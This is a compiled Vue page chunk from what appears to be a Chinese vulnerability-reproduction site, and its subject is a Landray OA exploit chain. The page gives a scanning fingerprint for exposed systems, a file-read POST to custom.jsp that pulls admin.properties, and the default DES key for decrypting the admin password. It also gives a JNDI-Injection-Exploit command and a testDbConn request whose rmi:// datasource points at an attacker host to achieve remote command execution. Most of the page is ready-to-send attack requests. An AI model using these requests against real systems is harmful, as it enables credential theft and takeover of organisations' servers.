import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as l,c as r,a as e,b as i,d as a,e as d}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),p={href:"http://admin.do",target:"_blank",rel:"noopener noreferrer"},u=d(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>蓝凌OA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Landray-OA系统&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用 <strong>蓝凌OA custom.jsp 任意文件读取漏洞</strong> 读取配置文件</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>/WEB-INF/KmssConfig/admin.properties
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>发送请求包</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 60
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

var={&quot;body&quot;:{&quot;file&quot;:&quot;/WEB-INF/KmssConfig/admin.properties&quot;}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090125006.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>获取password后，使用 DES方法 解密，默认密钥为 <strong>kmssAdminKey</strong></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090125061.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问后台地址使用解密的密码登录</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/admin.do
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090126340.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用工具执行命令</p>`,16),m={href:"https://github.com/welk1n/JNDI-Injection-Exploit",target:"_blank",rel:"noopener noreferrer"},v=d(`<div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>运行工具监听端口 ping dnslog测试 命令执行 (蓝凌OA 默认使用的是 JDK 1.7)</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /admin.do HTTP/1.1
Host: 
Cookie: JSESSIONID=90EA764774514A566C480E9726BB3D3F; Hm_lvt_9838edd365000f753ebfdc508bf832d3=1620456866; Hm_lpvt_9838edd365000f753ebfdc508bf832d3=1620459967
Content-Length: 70
Cache-Control: max-age=0
Sec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;, &quot;Google Chrome&quot;;v=&quot;90&quot;
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Origin: 
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

method=testDbConn&amp;datasource=rmi://xxx.xxx.xxx.xxx:1099/cbdsdg
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202090126051.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,4);function g(b,h){const n=s("ExternalLinkIcon");return l(),r("div",null,[c,e("p",null,[i("深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息，读取配置文件得到密钥后访问 "),e("a",p,[i("admin.do"),a(n)]),i(" 即可利用 JNDI远程命令执行获取权限")]),u,e("p",null,[e("a",m,[i("https://github.com/welk1n/JNDI-Injection-Exploit"),a(n)])]),v])}const _=t(o,[["render",g],["__file","蓝凌OA admin.do JNDI远程命令执行.html.vue"]]);export{_ as default};
